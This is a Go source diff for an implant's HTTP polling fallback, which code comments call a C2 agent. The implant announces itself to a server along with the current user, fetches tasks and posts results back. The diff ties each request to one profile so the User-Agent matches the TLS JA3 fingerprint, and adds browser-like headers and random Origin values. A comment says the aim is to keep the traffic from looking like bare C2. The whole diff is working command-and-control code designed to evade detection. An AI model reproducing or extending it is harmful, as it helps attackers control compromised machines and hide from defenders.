@@ -125,7 +125,7 @@ func isHttpPollEnabled() bool {
 }
 
 func runPollClient(cfg config.Config) {
-	transport, err := createHTTPTransport(cfg)
+	transport, pollProfile, err := createHTTPTransport(cfg)
 	if err != nil {
 		log.Printf("[poll] refusing to start with invalid TLS configuration: %v", err)
 		return
@@ -139,10 +139,14 @@ func runPollClient(cfg config.Config) {
 	clientID := cfg.ID
 	token := cfg.AgentToken
 
+	ctx, cancel := context.WithCancel(context.Background())
+	defer cancel()
+
 	writer := &httpPollWriter{}
 	env := &rt.Env{
-		Conn: writer,
-		Cfg:  cfg,
+		Conn:   writer,
+		Cfg:    cfg,
+		Cancel: cancel,
 	}
 	env.SetServerClientID(clientID)
 
@@ -151,11 +155,9 @@ func runPollClient(cfg config.Config) {
 	log.Printf("[poll] starting HTTP polling fallback → %s (interval: %s)", baseURL, pollInterval)
 
 	// Announce ourselves: send a lightweight hello so the server registers this agent.
-	if err := pollHello(httpClient, baseURL, clientID, token, cfg); err != nil {
+	if err := pollHello(httpClient, baseURL, clientID, token, cfg, pollProfile); err != nil {
 		log.Printf("[poll] hello failed: %v (continuing anyway)", err)
 	}
-
-	ctx := context.Background()
 
 	const maxBackoff = 5 * time.Minute
 	backoff := pollInterval
@@ -166,7 +168,7 @@ func runPollClient(cfg config.Config) {
 
 	for range ticker.C {
 		ticker.Reset(jitteredPollInterval())
-		commands, err := pollFetchTasks(httpClient, baseURL, clientID, token)
+		commands, err := pollFetchTasks(httpClient, baseURL, clientID, token, pollProfile)
 		if err != nil {
 			consecutiveErrs++
 			log.Printf("[poll] fetch tasks failed (err #%d): %v", consecutiveErrs, err)
@@ -215,7 +217,7 @@ func runPollClient(cfg config.Config) {
 		// Flush any results the dispatcher wrote back.
 		results := writer.drain()
 		for _, r := range results {
-			if err := pollPostResult(httpClient, baseURL, clientID, token, r); err != nil {
+			if err := pollPostResult(httpClient, baseURL, clientID, token, r, pollProfile); err != nil {
 				log.Printf("[poll] post result failed for %s: %v", r.ID, err)
 			}
 		}
@@ -229,7 +231,7 @@ func runPollClient(cfg config.Config) {
 // pollHello sends a lightweight announce payload so the server knows the agent
 // is alive in poll mode. It reuses the same /api/poll/:id/results path with a
 // synthetic result bearing type "poll_hello".
-func pollHello(client *http.Client, baseURL, clientID, token string, cfg config.Config) error {
+func pollHello(client *http.Client, baseURL, clientID, token string, cfg config.Config, profile malleableProfile) error {
 	payload := map[string]interface{}{
 		"id": "poll_hello",
 		"result": map[string]interface{}{
@@ -241,13 +243,13 @@ func pollHello(client *http.Client, baseURL, clientID, token string, cfg config.
 			"user":    rt.CurrentUser(),
 		},
 	}
-	return pollPost(client, baseURL+"/api/poll/"+clientID+"/results", token, payload)
+	return pollPost(client, baseURL+"/api/poll/"+clientID+"/results", token, payload, profile)
 }
 
-// addMalleableHeaders sets browser-like headers on req to match the WebSocket
-// dial's malleable profile.  Keeps HTTP poll traffic from looking like bare C2.
-func addMalleableHeaders(req *http.Request) {
-	req.Header.Set("User-Agent", randomProfile().UserAgent)
+// addMalleableHeaders sets browser-like headers on req using the given profile
+// so the User-Agent always matches the TLS JA3 fingerprint used in this session.
+func addMalleableHeaders(req *http.Request, profile malleableProfile) {
+	req.Header.Set("User-Agent", profile.UserAgent)
 	req.Header.Set("Accept-Language", malleableAcceptLanguages[mrand.Intn(len(malleableAcceptLanguages))])
 	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
 	req.Header.Set("Sec-Fetch-Site", "same-origin")
@@ -255,14 +257,14 @@ func addMalleableHeaders(req *http.Request) {
 	req.Header.Set("Sec-Fetch-Dest", "empty")
 }
 
-func pollFetchTasks(client *http.Client, baseURL, clientID, token string) ([]pollCommand, error) {
+func pollFetchTasks(client *http.Client, baseURL, clientID, token string, profile malleableProfile) ([]pollCommand, error) {
 	req, err := http.NewRequest("GET", baseURL+"/api/poll/"+clientID+"/tasks", nil)
 	if err != nil {
 		return nil, err
 	}
 	req.Header.Set("X-Agent-Token", token)
 	req.Header.Set("Accept", "application/json, text/plain, */*")
-	addMalleableHeaders(req)
+	addMalleableHeaders(req, profile)
 
 	resp, err := client.Do(req)
 	if err != nil {
@@ -289,11 +291,11 @@ func pollFetchTasks(client *http.Client, baseURL, clientID, token string) ([]pol
 	return commands, nil
 }
 
-func pollPostResult(client *http.Client, baseURL, clientID, token string, r pollResultPost) error {
-	return pollPost(client, baseURL+"/api/poll/"+clientID+"/results", token, r)
+func pollPostResult(client *http.Client, baseURL, clientID, token string, r pollResultPost, profile malleableProfile) error {
+	return pollPost(client, baseURL+"/api/poll/"+clientID+"/results", token, r, profile)
 }
 
-func pollPost(client *http.Client, url, token string, payload interface{}) error {
+func pollPost(client *http.Client, url, token string, payload interface{}, profile malleableProfile) error {
 	body, err := json.Marshal(payload)
 	if err != nil {
 		return err
@@ -305,7 +307,7 @@ func pollPost(client *http.Client, url, token string, payload interface{}) error
 	req.Header.Set("Content-Type", "application/json")
 	req.Header.Set("X-Agent-Token", token)
 	req.Header.Set("Origin", malleableOrigins[mrand.Intn(len(malleableOrigins))])
-	addMalleableHeaders(req)
+	addMalleableHeaders(req, profile)
 
 	resp, err := client.Do(req)
 	if err != nil {
